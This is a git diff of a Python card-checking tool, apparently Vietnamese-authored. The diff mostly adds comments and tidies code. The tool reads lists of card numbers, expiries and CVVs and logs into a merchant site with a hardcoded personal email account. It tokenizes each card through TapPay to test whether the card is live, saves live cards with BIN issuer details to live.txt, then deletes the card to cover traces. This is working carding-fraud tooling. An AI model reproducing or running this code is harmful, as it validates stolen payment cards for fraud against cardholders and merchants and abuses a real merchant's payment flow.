@@ -16,12 +16,13 @@ from datetime import datetime, timedelta
 import subprocess
 import signal
 
+# Khởi tạo các biến global
 colorama.init(autoreset=True)
-
 stop_flag = threading.Event()
 processed_cards = set()
 processed_cards_lock = threading.Lock()
 
+# Biến theo dõi thống kê
 stats = {
     'total_cards': 0,
     'processed_cards': 0,
@@ -36,21 +37,19 @@ stats = {
 cards = []
 
 def generate_random_string(pattern):
+    # Hàm tạo chuỗi ngẫu nhiên theo pattern
     result = ""
     for char in pattern:
-        if char == 'u':
-            result += random.choice(string.ascii_uppercase)  # Chọn ngẫu nhiên chữ cái viết hoa
-        elif char == 'l':
-            result += random.choice(string.ascii_lowercase)  # Chọn ngẫu nhiên chữ cái viết thường
-        elif char == 'd':
-            result += random.choice(string.digits)  # Chọn ngẫu nhiên chữ số
-        else:
-            result += char
+        if char == 'u': result += random.choice(string.ascii_uppercase)
+        elif char == 'l': result += random.choice(string.ascii_lowercase)
+        elif char == 'd': result += random.choice(string.digits)
+        else: result += char
     return result
 
 def check_bin(card_number):
+    # Kiểm tra thông tin BIN của thẻ
     try:
-        bin_number = card_number[:6]  # Lấy 6 số đầu của thẻ
+        bin_number = card_number[:6]
         response = requests.get(f'https://data.handyapi.com/bin/{bin_number}', 
                               headers={'Referer': 'your-domain'})
         
@@ -65,17 +64,18 @@ def check_bin(card_number):
                 }
         return None
     except Exception as e:
-        print(Fore.RED + f"Error checking BIN: {str(e)}" + Style.RESET_ALL)
+        print(Fore.RED + f"Lỗi khi check BIN: {str(e)}" + Style.RESET_ALL)
         return None
 
 def check_card(card_info):
+    # Kiểm tra tính hợp lệ của thẻ
     if stop_flag.is_set():
         return
     
-    # Tạo card_string cơ bản không có thông tin bin
     card_string = f"{card_info['number']}|{card_info['month']}|{card_info['year']}|{card_info['cvv']}"
 
     try:
+        # Thiết lập headers cơ bản
         base_headers = {
             "scheme": "https",
             "accept": "application/json, text/plain, */*",
@@ -94,8 +94,9 @@ def check_card(card_info):
             "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
         }
 
-        session = requests.Session()  # Tạo một session mới để quản lý cookies
-
+        # Khởi tạo session và đăng nhập
+        session = requests.Session()
+        
         login_data = {
             "action": "login",
             "email": "yobincoesparanza@gmail.com",
@@ -156,6 +157,7 @@ def check_card(card_info):
             headers=tappay_headers
         )
 
+        # Xử lý kết quả check card
         if prime_response.ok:
             try:
                 prime_data = prime_response.json()
@@ -200,27 +202,22 @@ def check_card(card_info):
 
                         response_json = save_response.json()
                         if response_json.get("success"):
-                            # Thẻ LIVE - Lưu thẻ trước
+                            # Thẻ LIVE
                             with stats['stats_lock']:
                                 stats['live_count'] += 1
                                 stats['processed_cards'] += 1
-                            print(Fore.GREEN + f"Card check successful: {card_info['number']} (LIVE) | Live: {stats['live_count']} | Die: {stats['die_count']}" + Style.RESET_ALL)
                             
-                            # Check bin sau khi thẻ LIVE
+                            # Check thông tin BIN và lưu kết quả
                             bin_info = check_bin(card_info['number'])
                             if bin_info:
-                                card_string_with_info = (f"{card_info['number']}|{card_info['month']}|{card_info['year']}|"
-                                                    f"{card_info['cvv']}|{bin_info['type']}|{bin_info['issuer']}|"
-                                                    f"{bin_info['tier']}|{bin_info['country']}")
-                                # Lưu thẻ với thông tin bin
+                                card_string_with_info = f"{card_string}|{bin_info['type']}|{bin_info['issuer']}|{bin_info['tier']}|{bin_info['country']}"
                                 with open('live.txt', 'a') as live_file:
                                     live_file.write(f"LIVE|{card_string_with_info}\n")
                             else:
-                                # Lưu thẻ không có thông tin bin
                                 with open('live.txt', 'a') as live_file:
                                     live_file.write(f"LIVE|{card_string}\n")
 
-                            # Sau khi check bin và lưu thẻ, thực hiện xóa thẻ
+                            # Xóa thẻ sau khi check thành công
                             try:
                                 print(Fore.YELLOW + "Starting card deletion process..." + Style.RESET_ALL)
                                 
@@ -267,7 +264,7 @@ def check_card(card_info):
                             except Exception as e:
                                 print(Fore.RED + f"Error in deletion process: {str(e)}" + Style.RESET_ALL)
                         else:
-                            # Thẻ DIE 
+                            # Thẻ DIE
                             with stats['stats_lock']:
                                 stats['die_count'] += 1
                                 stats['processed_cards'] += 1
@@ -452,26 +449,17 @@ def signal_handler(signum, frame):
     sys.exit(0)
 
 def main():
-    global cards
-    signal.signal(signal.SIGINT, signal_handler)  # Đăng ký hàm xử lý tín hiệu
-    
+    # Khởi tạo chương trình
+    signal.signal(signal.SIGINT, signal_handler)
     clear_console()
     
-    print(Fore.BLUE + r"""
-  ____ _               _       ____ _                             ____ ______     __
- / ___| |__   ___  ___| | __  / ___| |__   __ _ _ __ __ _  ___   / ___/ ___\ \   / /
-| |   | '_ \ / _ \/ __| |/ / | |   | '_ \ / _` | '__/ _` |/ _ \ | |  | |    \ \ / / 
-| |___| | | |  __/ (__|   <  | |___| | | | (_| | | | (_| |  __/ | |__| |___  \ V /  
- \____|_| |_|\___|\___|_|\_\  \____|_| |_|\__,_|_|  \__, |\___|  \____\____|  \_/   
-                                                    |___/                           
-
-          """ + Style.RESET_ALL)
-
+    # Hiển thị banner và thông tin
+    print(Fore.BLUE + "... banner ..." + Style.RESET_ALL)
     print(Fore.MAGENTA + "By:Nguyen Toan (Telegram: @toansx)" + Style.RESET_ALL)
     
+    # Chọn file input
     root = tk.Tk()
     root.withdraw()
-
     file_path = filedialog.askopenfilename(
         title="Chọn file .txt chứa danh sách thẻ",
         filetypes=[("Text files", "*.txt")]
